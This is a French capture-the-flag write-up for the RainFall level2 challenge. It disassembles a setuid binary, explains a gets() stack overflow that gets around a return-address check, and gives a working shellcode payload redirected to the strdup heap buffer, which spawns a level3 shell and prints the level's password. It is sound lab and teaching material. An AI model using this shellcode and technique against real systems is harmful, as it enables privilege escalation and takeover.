# 02 - Heap buffer overflow 1

- On se connecte en tant que level2:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
```

```
level2@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2

level2@RainFall:~$ gdb level2
```

```
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   %ebp
   0x08048540 <+1>:     mov    %esp,%ebp
   0x08048542 <+3>:     and    $0xfffffff0,%esp
   0x08048545 <+6>:     call   0x80484d4 <p>
   0x0804854a <+11>:    leave
   0x0804854b <+12>:    ret
End of assembler dump.
```

```
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   %ebp
   0x080484d5 <+1>:     mov    %esp,%ebp
   0x080484d7 <+3>:     sub    $0x68,%esp
   0x080484da <+6>:     mov    0x8049860,%eax
   0x080484df <+11>:    mov    %eax,(%esp)
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:    mov    %eax,(%esp)
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
   0x080484fb <+39>:    and    $0xb0000000,%eax
   0x08048500 <+44>:    cmp    $0xb0000000,%eax
   0x08048505 <+49>:    jne    0x8048527 <p+83>
   0x08048507 <+51>:    mov    $0x8048620,%eax
   0x0804850c <+56>:    mov    -0xc(%ebp),%edx
   0x0804850f <+59>:    mov    %edx,0x4(%esp)
   0x08048513 <+63>:    mov    %eax,(%esp)
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
   0x0804851b <+71>:    movl   $0x1,(%esp)
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:    mov    %eax,(%esp)
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:    mov    %eax,(%esp)
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave
   0x0804853e <+106>:   ret
End of assembler dump.
```


- Voyons les parties les plus importantes du programme:
```
   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:    mov    %eax,(%esp)
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
```
> Nous invite à écrire sans limite sur la stack.

```
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
   0x080484fb <+39>:    and    $0xb0000000,%eax
   0x08048500 <+44>:    cmp    $0xb0000000,%eax
   0x08048505 <+49>:    jne    0x8048527 <p+83>
```
>`0x4(%ebp)` --> `0xbffff70c`

>`0xbffff70c: 0x0804854a`

>`saved eip 0x804854a`
```
   0x08048507 <+51>:    mov    $0x8048620,%eax
   0x0804850c <+56>:    mov    -0xc(%ebp),%edx
   0x0804850f <+59>:    mov    %edx,0x4(%esp)
   0x08048513 <+63>:    mov    %eax,(%esp)
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
   0x0804851b <+71>:    movl   $0x1,(%esp)
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
```
>`0x8048620: "(%p)\n"`

>`-0xc(%ebp) --> 0xbffff70c`

>`0xbffff70c: 0x0804854a`

>`saved eip 0x804854a`

> Print l'adresse de retour de la fonction.

- Après notre input, si l'adresse de retour de la fonction commence par `0xb`, on appelle `<printf@plt>` puis `<_exit@plt>`. Sinon, on saute à `<puts@plt>`.

```
   0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:    mov    %eax,(%esp)
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
```

> Print le buffer


```
   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:    mov    %eax,(%esp)
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
```

> Copie le buffer dans le heap.


- Pour rediriger le flot d'exécution du programme, la fonction doit `return`, donc on doit éviter `<_exit@plt>`.


- On cherche à remplacer l'adresse de retour de la fonction par une adresse qui contient notre shellcode. Cependant, on ne peut pas stocker notre shellcode dans l'environnement ou dans la stack de la fonction `p()` car ces adresses commencent toutes par `0xb`.
```
(gdb) info reg
...
esp            0xbffff6a0       0xbffff6a0
ebp            0xbffff708       0xbffff708
...
```

```
(gdb) x/3s *(char**)environ
0xbffff8f5:      "SHELLCODE=1\322Rh//shh/bin\211\343\061\300\260\v̀"
0xbffff915:      "TERM=xterm-256color"
0xbffff929:      "SHELL=/bin/bash"
```

- Donc, on doit stocker notre shellcode dans des adresses plus basses, comme dans le heap à l'adresse retournée par `<strdup@plt>`.
```
(gdb) b*0x0804853d
Breakpoint 1 at 0x804853d
```

```
(gdb) r < <(echo 123)
...
Breakpoint 1, 0x08048538 in p ()

(gdb) x/s $eax
0x804a008:      "123"
```


- Ensuite, on trouve que l'adresse de retour de la fonction est remplacée après le 80ème caractère. On serait tenté de faire ceci:
```
(gdb) r < <(python -c "print '\x90'*53 + '\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + '\x08\xa0\x04\x08'"; cat)
```


- Mais on aurait un problème à cause de ceci:
```
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
```


- En effet, cette partie du code copie la valeur de l'adresse de retour de la fonction un peu plus bas dans la stack. Cela aurait pour effet d'écraser une partie de notre shellcode. Par conséquent, nous devons laisser un petit espace:
```
level2@RainFall:~$ (python -c "print '\x90'*37 + '\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + 'a'*16 + '\x08\xa0\x04\x08'"; cat) | ./level2
...
whoami
level3

cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```